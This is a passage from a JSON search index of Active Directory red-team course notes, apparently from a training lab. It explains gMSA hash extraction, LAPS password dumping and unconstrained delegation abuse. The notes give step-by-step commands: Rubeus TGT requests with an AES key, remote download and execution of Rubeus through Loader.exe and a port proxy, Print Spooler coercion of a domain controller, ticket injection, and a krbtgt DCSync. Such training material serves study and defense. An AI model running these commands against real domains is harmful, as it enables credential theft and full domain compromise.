extracts: NTLM hash AES128 key AES256 key Step 4 — Print Results Example output: sqlsvc$ NTLM: 9b3c2a7e8d... websvc$ NTLM: f1d2a6b3e4... backupsvc$ NTLM: a8d4c2f1b7... So you see multiple hashes ."},{"id":"why-you-might-have-permission-for-multiple-gmsas","u":"01_attacks-lateral-movement.html#why-you-might-have-permission-for-multiple-gmsas","sec":"Attacks + Lateral Movement","lvl":3,"t":"4. Why You Might Have Permission for Multiple gMSAs","c":"The permission is controlled by: PrincipalsAllowedToRetrieveManagedPassword Example configuration: sqlsvc$ Allowed: SQL01$ WEB01$ websvc$ Allowed: WEB01$ WEB02$ backupsvc$ Allowed: BACKUP01$ WEB01$ If you compromise WEB01 : WEB01$ You can retrieve passwords for: sqlsvc$ websvc$ backupsvc$ So multiple hashes appear ."},{"id":"real-attack-scenario","u":"01_attacks-lateral-movement.html#real-attack-scenario","sec":"Attacks + Lateral Movement","lvl":3,"t":"5. Real Attack Scenario","c":"Example compromise: Attacker → WEB01 WEB01 computer account allowed to read: sqlsvc$ websvc$ backupsvc$ Running NetExec: netexec ldap dc.corp.local -u web01$ -H <hash> --gmsa Output: sqlsvc$ NTLM: xxxxx websvc$ NTLM: xxxxx backupsvc$ NTLM: xxxxx Now attacker can: Pass-the-Hash Kerberos authentication service impersonation lateral movement"},{"id":"why-pentesters-love-gmsa","u":"01_attacks-lateral-movement.html#why-pentesters-love-gmsa","sec":"Attacks + Lateral Movement","lvl":3,"t":"6. Why Pentesters Love gMSA","c":"Because many admins configure it like this: PrincipalsAllowedToRetrieveManagedPassword: Domain Computers Meaning: ANY MACHINE IN DOMAIN ↓ can read gMSA password Then one compromise = all gMSA hashes ."},{"id":"visual-summary","u":"01_attacks-lateral-movement.html#visual-summary","sec":"Attacks + Lateral Movement","lvl":3,"t":"7. Visual Summary","c":"Active Directory │ ▼ gMSA Objects ├─ sqlsvc$ ├─ websvc$ ├─ backupsvc$ │ ▼ Each has msDS-ManagedPassword │ ▼ NetExec reads all accessible ones │ ▼ Multiple hashes returned"},{"id":"laps","u":"01_attacks-lateral-movement.html#laps","sec":"Attacks + Lateral Movement","lvl":2,"t":"LAPS","c":""},{"id":"understanding-the-core-concept-4","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-4","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-laps-local-administrator-password-solution","u":"01_attacks-lateral-movement.html#what-is-laps-local-administrator-password-solution","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚀 1. What is LAPS (Local Administrator Password Solution)?","c":"LAPS is a Microsoft solution that: ✔ Randomizes the ✔ Stores the password securely in Active Directory ✔ Automatically rotates the password after X days ✔ Controls which users/groups are allowed to read the password LAPS solves one of the biggest AD security problems : “Every machine having the SAME local admin password.” This leads to full domain compromise once one endpoint is hacked. The “Local Administrator Password Solution” (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset."},{"id":"why-laps-is-important-core-advantage","u":"01_attacks-lateral-movement.html#why-laps-is-important-core-advantage","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 2. Why LAPS is important (Core Advantage)","c":""},{"id":"advantage-1-stops-lateral-movement-pass-the-hash-pass-the-password","u":"01_attacks-lateral-movement.html#advantage-1-stops-lateral-movement-pass-the-hash-pass-the-password","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Advantage #1 — Stops Lateral Movement (Pass-the-Hash / Pass-the-Password)","c":"Without LAPS: All endpoints have the same local Administrator password Attacker compromises one machine Dumps local admin hash Uses that hash to move laterally to any machine → psexec, wmiexec, smbexec → Full environment compromise With LAPS: Each machine has unique local admin password Compromising one endpoint → gives password/hash only for that one machine Cannot be reused elsewhere Attack is contained This is LAPS’ primary security benefit ."},{"id":"advantage-2-automatic-password-rotation","u":"01_attacks-lateral-movement.html#advantage-2-automatic-password-rotation","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Advantage #2 — Automatic password rotation","c":"Admins no longer need to create scripts or GPOs. LAPS handles: Password complexity Password length Expiration Automatic reset"},{"id":"advantage-3-password-is-not-stored-locally","u":"01_attacks-lateral-movement.html#advantage-3-password-is-not-stored-locally","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Advantage #3 — Password is not stored locally","c":"It is stored only in Active Directory in the computer object. Thus an attacker cannot read the password from the local machine."},{"id":"where-is-the-laps-password-stored","u":"01_attacks-lateral-movement.html#where-is-the-laps-password-stored","sec":"Attacks + Lateral Movement","lvl":3,"t":"☑️ 3. Where is the LAPS password stored?","c":"🔹 Location 1: Local Machine (SAM) On PC01: ✔ Local Administrator account exists ✔ Only Password hash exists Stored in: SAM database Think: PC01 │ └── SAM └── Administrator NT Hash Important: ⚠️ SAM stores the hash , not the plaintext password. 🔹 Location 2: Active Directory (Computer Object) Inside AD: PC01$ computer object contains LAPS attributes. Think: PC01$ │ ├── DNS Name ├── Operating System ├── SPNs └── LAPS Attributes"},{"id":"legacy-microsoft-laps-attributes","u":"01_attacks-lateral-movement.html#legacy-microsoft-laps-attributes","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Legacy Microsoft LAPS Attributes","c":"Older LAPS used: ✔ ms-Mcs-AdmPwd Stores: ➡ Current local admin password ✔ ms-Mcs-AdmPwdExpirationTime Stores: ➡ Password expiration timestamp Example: PC01$ │ ├── ms-Mcs-AdmPwd │ = X7!kaP92 │ └── ms-Mcs-AdmPwdExpirationTime = 2026-07-17"},{"id":"new-windows-laps-modern","u":"01_attacks-lateral-movement.html#new-windows-laps-modern","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 New Windows LAPS (Modern)","c":"Microsoft introduced: Windows LAPS New attributes include: ✔ msLAPS-Password ✔ msLAPS-PasswordExpirationTime ✔ msLAPS-EncryptedPassword ✔ Other LAPS-related attributes Depending on configuration."},{"id":"is-this-stored-in-ntds.dit","u":"01_attacks-lateral-movement.html#is-this-stored-in-ntds.dit","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Is This Stored In NTDS.dit?","c":"✅ Yes This is where people get confused. Everything in AD objects ultimately resides in: NTDS.dit including: ✔ User objects ✔ Group objects ✔ Computer objects ✔ LAPS attributes Think: NTDS.dit │ ├── User Objects ├── Group Objects ├── Computer Objects │ │ │ └── PC01$ │ └── msLAPS-Password │ └── Other AD Data"},{"id":"so-where-is-the-password-actually","u":"01_attacks-lateral-movement.html#so-where-is-the-password-actually","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 So Where Is The Password Actually?","c":"For a machine managed by LAPS: On PC01 ✔ Administrator account ✔ NT hash Stored in SAM In AD ✔ Current LAPS password Stored as a computer object attribute Ultimately residing in NTDS.dit"},{"id":"who-can-read-the-laps-password-critical","u":"01_attacks-lateral-movement.html#who-can-read-the-laps-password-critical","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 4. Who can read the LAPS password? (Critical)","c":"Reading LAPS password requires special permissions. Only groups/accounts with this AD right: All extended rights → on the computer object Or specifically granted: Read ms-Mcs-AdmPwd Typical readers: Domain Admins Help Desk staff IT Operations SCCM / Intune automation accounts If an attacker compromises one of these → they can read passwords for ALL endpoints ."},{"id":"how-to-read-laps-password-manual-example","u":"01_attacks-lateral-movement.html#how-to-read-laps-password-manual-example","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 5. How to Read LAPS Password? (Manual Example)","c":"Using PowerShell (AD RSAT) Get-ADComputer WIN10-CL01 -Properties ms-Mcs-AdmPwd Output: ms-Mcs-AdmPwd : Z>@cN7]f$S2Zy$Xm If your user has no rights → output is blank. Using PowerShell LAPS module Get-AdmPwdPassword -ComputerName WIN10-CL01"},{"id":"reading-laps-password-using-bloodhound","u":"01_attacks-lateral-movement.html#reading-laps-password-using-bloodhound","sec":"Attacks + Lateral Movement","lvl":3,"t":"🩸 6. Reading LAPS Password using BloodHound","c":"BloodHound detects: Which users/groups can read LAPS passwords Which machines have LAPS enabled Which node has Read LAPS Password privilege"},{"id":"bloodhound-right-name","u":"01_attacks-lateral-movement.html#bloodhound-right-name","sec":"Attacks + Lateral Movement","lvl":3,"t":"BloodHound right name:","c":"Read LAPS Password"},{"id":"what-permission-is-this","u":"01_attacks-lateral-movement.html#what-permission-is-this","sec":"Attacks + Lateral Movement","lvl":3,"t":"What permission is this?","c":"BloodHound maps this to: Control Attribute (ms-Mcs-AdmPwd) and Read Property"},{"id":"in-bloodhound-you-will-see","u":"01_attacks-lateral-movement.html#in-bloodhound-you-will-see","sec":"Attacks + Lateral Movement","lvl":4,"t":"In BloodHound you will see:","c":"User → Computer → “Reads LAPS Password” Group → Computer → “Reads LAPS Password” If you have this edge → you can dump."},{"id":"complete-permission-matrix","u":"01_attacks-lateral-movement.html#complete-permission-matrix","sec":"Attacks + Lateral Movement","lvl":3,"t":"📋 Complete Permission Matrix","c":"Permission | Can Read LAPS Directly? | Escalation Path | Severity | — | — | — | — | Read Property (ms-Mcs-AdmPwd) | ✅ Yes | — | Direct | GenericAll | ✅ Yes | Full Control | Critical | WriteDACL | ❌ No | Modify DACL → add Read Property | High | WriteOwner | ❌ No | Become owner → Full Control | High | AllExtendedRights | ❌ No | Reset LAPS → read if you have Read Property | Medium | GenericWrite | ❌ No | Reset LAPS (if Write is on attribute) | Medium | ReadControl | ❌ No | Read DACL → target users with LAPS read | Low | DCSync / Replication | ✅ Yes | Bypass ACLs entirely | CRITICAL | Backup Operator | ✅ Yes | Backup DC → extract LAPS offline | CRITICAL | Local Admin | ✅ Yes | Read registry/Event Viewer | High | Modify Group | ❌ No | Add yourself to LAPS group | Medium | Self/Parent Owner | ✅ Yes | Implicit Full Control | High | Service Account Compromise | ✅ Yes | Use compromised account | Depends | Modify GPO | ❌ No | Create LAPS exfil task | Medium |"},{"id":"what-rights-does-a-user-need-to-read-laps","u":"01_attacks-lateral-movement.html#what-rights-does-a-user-need-to-read-laps","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧨 7. What rights does a user need to read LAPS?","c":"Only two specific rights : ✔ Right 1 — Read ms-Mcs-AdmPwd ReadProperty ✔ Right 2 — ExtendedRight on Computer Objects AllExtendedRights These are granted using: Delegation Wizard ACL Editor Custom OU delegation If a user has these → they can read the local administrator password for every machine inside that OU ."},{"id":"real-world-attack-scenario-step-by-step","u":"01_attacks-lateral-movement.html#real-world-attack-scenario-step-by-step","sec":"Attacks + Lateral Movement","lvl":3,"t":"⚠️ 8. Real-World Attack Scenario (Step-by-Step)","c":""},{"id":"case-local-admin-on-one-machine-is-compromised","u":"01_attacks-lateral-movement.html#case-local-admin-on-one-machine-is-compromised","sec":"Attacks + Lateral Movement","lvl":4,"t":"Case: Local Admin on one machine is compromised","c":"Normally: Attacker dumps local admin NTLM hash Uses hash to pivot to many machines (Pass-the-Hash) Compromise spreads everywhere With LAPS: Attacker dumps the local admin hash Tries Pass-the-Hash on another machine Fails , because password/hash is different Attack stops there Unless the attacker has rights to read ms-Mcs-AdmPwd ."},{"id":"red-team-scenario-attacker-steals-laps-passwords","u":"01_attacks-lateral-movement.html#red-team-scenario-attacker-steals-laps-passwords","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧨 9. Red Team Scenario: Attacker steals LAPS passwords","c":"If attacker compromises a helpdesk/IT account that has LAPS reading privileges, they can: Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd This gives: Password for every endpoint Full lateral movement capability Often full domain compromise LAPS is only safe if privileged access is controlled properly."},{"id":"summary-table-4","u":"01_attacks-lateral-movement.html#summary-table-4","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 10. Summary Table","c":"Topic | Explanation | — | — | What is LAPS? | AD feature rotating unique local admin passwords | Main advantage | Stops lateral movement (unique passwords per machine) | Why not reusable? | Each machine has different local admin password | Where password stored? | ms-Mcs-AdmPwd attribute in AD | Who can read it? | Users/groups with ReadProperty + ExtendedRights | BloodHound mapping | “Reads LAPS Password” edge | How to read manually? | Get-ADComputer -Properties ms-Mcs-AdmPwd | Security risk | If attacker gets an account with read access → full compromise |"},{"id":"example-3","u":"01_attacks-lateral-movement.html#example-3","sec":"Attacks + Lateral Movement","lvl":3,"t":"Example","c":""},{"id":"what-laps-does","u":"01_attacks-lateral-movement.html#what-laps-does","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What LAPS does:","c":"Every few days, each computer automatically changes its local admin password That password is stored securely in Active Directory Only authorized users/groups can read it 💡 Result: If one system is hacked, the attacker can’t reuse the local admin password elsewhere because it’s different on every system ."},{"id":"where-is-the-laps-password-stored-1","u":"01_attacks-lateral-movement.html#where-is-the-laps-password-stored-1","sec":"Attacks + Lateral Movement","lvl":2,"t":"💻 Where is the LAPS Password Stored?","c":"It’s saved in Active Directory under the computer object. Example: Computer: SQL01.INLANEFREIGHT.LOCAL In AD: It stores ms-Mcs-AdmPwd = 9G#f;p41dcAe,s Only special groups (like LAPS Admins ) can view this."},{"id":"as-an-attacker-why-you-care","u":"01_attacks-lateral-movement.html#as-an-attacker-why-you-care","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔍 As an Attacker: Why You Care","c":"If your current user or another compromised user : Is in LAPS Admins group , or Has All Extended Rights on a system 👉 You can read the local admin password for other systems and use it for lateral movement ."},{"id":"how-to-enumerate-laps","u":"01_attacks-lateral-movement.html#how-to-enumerate-laps","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧪 How to Enumerate LAPS","c":""},{"id":"step-1-check-which-ous-organizational-units-use-laps","u":"01_attacks-lateral-movement.html#step-1-check-which-ous-organizational-units-use-laps","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 1 – Check Which OUs (Organizational Units) Use LAPS","c":"powershell Find-LAPSDelegatedGroups Output: OU=Servers → LAPS Admins OU=Workstations → Domain Admins 🧠 Meaning: Users in LAPS Admins or Domain Admins can read local admin passwords."},{"id":"step-2-check-specific-group-access-to-machines","u":"01_attacks-lateral-movement.html#step-2-check-specific-group-access-to-machines","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 2 – Check Specific Group Access to Machines","c":"powershell Find-AdmPwdExtendedRights Output: ComputerName Identity Reason SQL01 INLANEFREIGHT\\LAPS Admins Delegated EXCHG01 INLANEFREIGHT\\Domain Admins Delegate 🎯 If you compromise a LAPS Admin , you can read passwords for these computers ."},{"id":"step-3-dump-the-actual-local-admin-passwords-if-allowed","u":"01_attacks-lateral-movement.html#step-3-dump-the-actual-local-admin-passwords-if-allowed","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 3 – Dump the Actual Local Admin Passwords (if allowed)","c":"powershell Get-LAPSComputers Output: ComputerName Password Expiration WS01 TCaG-F)3No;l8C 09/26/2020 SQL01 9G#f;p41dcAe,s 09/26/2020 💥 You now have clear-text admin passwords ! Try using psexec , wmiexec , or RDP to connect to those hosts as Administrator ."},{"id":"unconstrained-delegation","u":"01_attacks-lateral-movement.html#unconstrained-delegation","sec":"Attacks + Lateral Movement","lvl":2,"t":"Unconstrained Delegation","c":""},{"id":"understanding-the-core-concept-5","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-5","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-kerberos-delegation","u":"01_attacks-lateral-movement.html#what-is-kerberos-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 What is Kerberos Delegation?","c":"Kerberos Delegation is a way to allow a service (like a web server) to impersonate a user and access resources on their behalf — e.g., a backend file server or database. 💡 In simple terms: “A user logs into a front-end server. The server uses that user’s identity to request data from another server — without asking for the user’s credentials again.” This makes delegation powerful , but also risky if misconfigured."},{"id":"what-unconstrained-delegation-actually-means","u":"01_attacks-lateral-movement.html#what-unconstrained-delegation-actually-means","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ What Unconstrained Delegation Actually Means","c":"When an account (usually a computer ) is configured for unconstrained delegation, the flag set is: TRUSTED_FOR_DELEGATION in the userAccountControl attribute. In the Delegation tab it appears as: Trust this computer for delegation to any service (Kerberos only) Key idea: ➡ The service can impersonate users to ANY service in the domain . There is no restriction list like constrained delegation"},{"id":"what-the-kdc-does-differently","u":"01_attacks-lateral-movement.html#what-the-kdc-does-differently","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ What the KDC Does Differently","c":"Normally when a user authenticates to a service, the KDC only sends a service ticket . But if the target service has unconstrained delegation enabled , the KDC also forwards the user’s TGT . So the ticket the service receives contains: User TGS + User TGT This is the crucial part. The service now has a copy of the user’s TGT ."},{"id":"why-the-tgt-matters","u":"01_attacks-lateral-movement.html#why-the-tgt-matters","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Why the TGT Matters","c":"A TGT lets you request tickets to ANY service . Meaning: TGT → request TGS → any SPN So if a service receives a user’s TGT, it can request: CIFS/DC01 LDAP/DC01 HOST/DC01 MSSQLSvc/SQL01 There is no restriction ."},{"id":"how-the-configuration-works","u":"01_attacks-lateral-movement.html#how-the-configuration-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"How the configuration works ??","c":""},{"id":"the-delegation-setting-in-active-directory","u":"01_attacks-lateral-movement.html#the-delegation-setting-in-active-directory","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ The Delegation Setting in Active Directory","c":"Suppose an administrator configures a server: Inside Active Directory , the computer object has: Attribute: Flag enabled: WEB01 userAccountControl : TRUSTED_FOR_DELEGATION In the GUI it appears as: Trust this computer for delegation to any service (Kerberos only) Meaning: WEB01 can act on behalf of users to ANY service There is no restriction list like constrained delegation."},{"id":"what-the-kdc-understands-from-this-setting","u":"01_attacks-lateral-movement.html#what-the-kdc-understands-from-this-setting","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ What the KDC Understands From This Setting","c":"When the Kerberos Key Distribution Center (KDC) sees: WEB01 → TRUSTED_FOR_DELEGATION it interprets it as: If a user authenticates to WEB01 → WEB01 may need to access other services as that user So the KDC must give WEB01 the user’s Kerberos credentials . Specifically: Forwarded TGT"},{"id":"example-domain","u":"01_attacks-lateral-movement.html#example-domain","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Example Domain","c":"Environment: Domain: corp.local Machines: DC01 WEB01 (unconstrained delegation enabled) SQL01 FILE01 Configuration: WEB01$ userAccountControl: TRUSTED_FOR_DELEGATION"},{"id":"permission-that-can-lead-to-abuse","u":"01_attacks-lateral-movement.html#permission-that-can-lead-to-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"Permission That Can Lead To Abuse","c":""},{"id":"conditions-required-for-unconstrained-delegation-abuse","u":"01_attacks-lateral-movement.html#conditions-required-for-unconstrained-delegation-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Conditions Required for Unconstrained Delegation Abuse","c":"For the attack to work, these conditions must exist. Condition 1 — A computer with unconstrained delegation Example: WEB01$ Attribute: userAccountControl: TRUSTED_FOR_DELEGATION Meaning: WEB01 can receive user TGTs This is usually discovered using tools like BloodHound. Condition 2 — Attacker can compromise that server Example: Attacker → local admin on WEB01 This could happen via: credential reuse RCE weak service account lateral movement Once inside, the attacker controls the system. Condition 3 — A user authenticates to the server When a user authenticates: User → WEB01 The KDC sends: User TGS + User TGT The TGT is stored inside LSASS memory ."},{"id":"when-a-user-already-logged-into-the-server","u":"01_attacks-lateral-movement.html#when-a-user-already-logged-into-the-server","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ When a User Already Logged Into the Server","c":"If a privileged user (for example Domain Admin) logged in: Administrator → WEB01 Then inside LSASS: Administrator TGT Attacker extracts it using: Mimikatz Rubeus Then they request: Administrator → CIFS/DC01 Result: Domain Controller access That’s the easy scenario ."},{"id":"is-local-admin-required-to-abuse-it","u":"01_attacks-lateral-movement.html#is-local-admin-required-to-abuse-it","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Is Local Admin Required to Abuse It?","c":"Yes — in almost every practical attack you need local admin on that machine. Reason: To extract Kerberos tickets you must access: LSASS memory Accessing LSASS requires: Local Administrator privileges Without that you normally cannot dump the tickets. Common tools that read LSASS: Mimikatz Rubeus Both require high privileges ."},{"id":"user-authenticates-to-the-computer","u":"01_attacks-lateral-movement.html#user-authenticates-to-the-computer","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ User Authenticates to the Computer","c":"Suppose a domain admin logs into the machine: Administrator → WEB01 Example access: RDP login SMB share Web application Now Kerberos authentication begins. Step 1 — Administrator Requests Service Ticket Administrator asks the KDC: Give me a ticket for HOST/WEB01 This is a TGS request . Step 2 — KDC Checks the Target Computer Object The KDC looks at the service account: WEB01$ It reads the attribute: userAccountControl and sees: TRUSTED_FOR_DELEGATION Meaning: This computer is trusted to impersonate users. Step 3 — KDC Issues the Ticket Normally the KDC would send only: Service Ticket → WEB01 But because unconstrained delegation is enabled , the KDC sends: Service Ticket for WEB01 + Administrator TGT So the computer receives: Administrator TGT"},{"id":"why-attackers-want-the-computer-with-delegation","u":"01_attacks-lateral-movement.html#why-attackers-want-the-computer-with-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Why Attackers Want the Computer With Delegation","c":"Because when anyone authenticates to that machine: User TGT → stored in LSASS If attacker controls the machine they can steal: Domain Admin TGT Service account TGT Machine account TGT"},{"id":"why-the-tgt-is-valuable","u":"01_attacks-lateral-movement.html#why-the-tgt-is-valuable","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Why the TGT Is Valuable","c":"A TGT allows requesting tickets for ANY service in the domain. So the attacker can now ask the KDC: Use Administrator TGT Request ticket for CIFS/DC01 The KDC checks: Is TGT valid? Yes. So it issues: Administrator → CIFS/DC01"},{"id":"attacker-uses-the-ticket","u":"01_attacks-lateral-movement.html#attacker-uses-the-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"9️⃣ Attacker Uses the Ticket","c":"Now the attacker can access: \\\\DC01\\C$ as: Administrator Or request: LDAP/DC01 which allows directory operations like replication."},{"id":"result","u":"01_attacks-lateral-movement.html#result","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔟 Result","c":"Because the attacker stole the Administrator TGT , they can act as that user anywhere: Administrator → SQL01 Administrator → FILE01 Administrator → DC01 Meaning the attacker effectively becomes the Administrator in the domain ."},{"id":"why-this-attack-works","u":"01_attacks-lateral-movement.html#why-this-attack-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣1️⃣ Why This Attack Works","c":"The root cause is: Unconstrained delegation forwards the user's TGT to the computer. So the machine stores: User Kerberos credentials If the attacker controls that machine, they can steal those credentials ."},{"id":"what-happens-if-no-one-logged-in-yet","u":"01_attacks-lateral-movement.html#what-happens-if-no-one-logged-in-yet","sec":"Attacks + Lateral Movement","lvl":3,"t":"What Happens If No One Logged In Yet","c":"You asked this earlier — very important point. If LSASS contains no useful TGT , attackers force authentication. Example: DC01 → WEB01 Kerberos flow: 1️⃣ DC01 requests: TGS for HOST/WEB01 2️⃣ KDC checks: WEB01$ → TRUSTED_FOR_DELEGATION 3️⃣ KDC sends: DC01$ TGT to the machine. Now LSASS contains: DC01$ TGT"},{"id":"windows-setup-example-poc","u":"01_attacks-lateral-movement.html#windows-setup-example-poc","sec":"Attacks + Lateral Movement","lvl":3,"t":"Windows Setup + Example ( PoC )","c":""},{"id":"step-1-reconnaissance-identify-machines-with-unconstrained-delegation","u":"01_attacks-lateral-movement.html#step-1-reconnaissance-identify-machines-with-unconstrained-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 Step 1: Reconnaissance — Identify Machines with Unconstrained Delegation","c":"Using PowerView : Get-DomainComputer -Unconstrained OR Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname -> gives only the name of machine which can be used for unconstrained delegation image.png image.png Using ActiveDirectory Module : Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True} These commands look for accounts (computers or services) where the TrustedForDelegation property is True . Note:- After getting the list of machines where unconstrained delegation is enabled, skip the domain controller because, there this feature might be enabled due to business requirement. Always target non DC machines. image.png"},{"id":"step-2-compromise-the-delegation-enabled-host","u":"01_attacks-lateral-movement.html#step-2-compromise-the-delegation-enabled-host","sec":"Attacks + Lateral Movement","lvl":3,"t":"🛠 Step 2: Compromise the Delegation-Enabled Host","c":"Assume you compromise a host like dcorp-appsrv (e.g., via RCE, credentials, misconfig, etc.). This machine is configured with Unconstrained Delegation . image.png From the above image we can se that appadmin has local admin privileges on dcorp-appsrv and in past in past lectures we compromised the appadmin, using the hash of appadmin we will open its session C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt image.png Above command will open a appadmin cmd session, on open cmd session run invishell image.png Now check whether the user appadmin has got local admin privileges on dcorp-appsrv, Using Find-PSRemotingAdminAccess.ps1 C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\ToolsFind-PSRemotingAdminAccess.ps1 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local image.png from above image we can see that some times the command crashes, to come this just mention the domain name in which you are targeting. Output of the command gave that user appadmin has got local admin privileges on dcorp-adminsrv and dcorp-appsrv, we will move forward with dcorp-appsrv Now run the rubeus in monitor mode dcorp-adminsrv , first copy loader the dcorp-appsrv and then connect wo dcorp-appsr v using winrs. echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dcorp-appsrv\\C$\\Users\\Public\\Loader.exe /Y and then winrs -r:dcorp-appsrv cmd image.png next down enable port fowarding on dcorp-appsrv and then download and execute rubeus on it, before that first host the hfs and upload there rubeus. netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x and then C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap --------------> Continious checks LSSASS of dcorp-appsrv in every 5second to verify if there is any TGT of Domain controller(dcropt-dc$) machine This continuously monitors LSASS for new Kerberos tickets. When the DC connects, its TGT will show up . You extract it in .kirbi format (Kerberos ticket file). image.png"},{"id":"step-3-wait-or-coerce-a-privileged-user-to-connect","u":"01_attacks-lateral-movement.html#step-3-wait-or-coerce-a-privileged-user-to-connect","sec":"Attacks + Lateral Movement","lvl":3,"t":"🛠 Step 3: Wait or Coerce a Privileged User to Connect","c":"You want a high-privileged account (like Domain Admin or DC) to connect to this machine. Option A: Wait A Domain Admin logs in via RDP, SMB or PowerShell remoting. Their TGT gets cached in LSASS automatically. Option B: Force (Coerce) Authentication You use a protocol abuse technique to force the DC to authenticate to dcorp-appsrv . Why? Because when the DC authenticates, its machine account ( dcorp-dc$ ) will give up its TGT , which is extremely powerful . Certain Microsoft services/protocols allow coercion — i.e., force a machine to make a network authentication request to another machine (your target)."},{"id":"available-coercion-protocols","u":"01_attacks-lateral-movement.html#available-coercion-protocols","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔧 Available Coercion Protocols:","c":"Protocol | Description | Default on | Ports | — | — | — | — | MS-RPRN | Print Spooler | Yes (Server OS) | 445(SMB) | MS-WSP | Windows Search | No (Default on Clients OS) | 445(SMB) | MS-DFSNM (MDI detects this) | DFS Namespace Mgmt | No | 445(SMB) | The MS-RPRN (Print Spooler) protocol contains a feature that allows any authenticated domain user to coerce any machine with the Print Spooler service running to initiate an authenticated connection to another machine of the attacker’s choice within the same domain So if Print Spooler is running on DC we can force the DC to connect to the machine where TrustedForDelegation is set to true."},{"id":"using-spoolsample-print-spooler-abuse","u":"01_attacks-lateral-movement.html#using-spoolsample-print-spooler-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"💥 Using SpoolSample (Print Spooler Abuse):","c":"C:\\AD\\Tools\\MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local This coerces the DC ( dcorp-dc ) to authenticate to the attacker-controlled appsrv. Result: The DC sends a Kerberos TGS that includes its TGT . LSASS on appsrv caches that TGT. image.png Once compromised, the next step is to capture a TGT of a high-privileged user (e.g., Domain Admin)."},{"id":"step-4-capture-the-domain-controllers-tgt","u":"01_attacks-lateral-movement.html#step-4-capture-the-domain-controllers-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"📥 Step 4: Capture the Domain Controller’s TGT","c":"Check the Rubeus for TGT of DC. image.png In above example we got base64 encoded TGT of domain controller. Optionally, use: SafetyKatz.exe \"sekurlsa::tickets /export\" This dumps all tickets from LSASS into .kirbi files."},{"id":"step-5-inject-the-dcs-tgt-into-your-session","u":"01_attacks-lateral-movement.html#step-5-inject-the-dcs-tgt-into-your-session","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔁 Step 5: Inject the DC’s TGT into Your Session","c":"Now from from high Integrity shell on student Vm Inject the stolen TGT of dcorp-dc$ into another system under your control (e.g., the student VM): Rubeus.exe ptt /ticket:<TGT_base64_or_path> OR C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe ptt /ticket:<TGT_base64_or_path> This will inject the DC’s TGT into your current session — you now effectively are the DC for Kerberos purposes. image.png OR image.png To verify whether the TGT has been Imported to the current user session, we can run klist command. image.png Above example shows we have TGT of domain controller in current user session. 🔓 Step 6: Perform DCSync Now that you’re impersonating the DC via its TGT, run: SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\\\krbtgt\" OR C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe 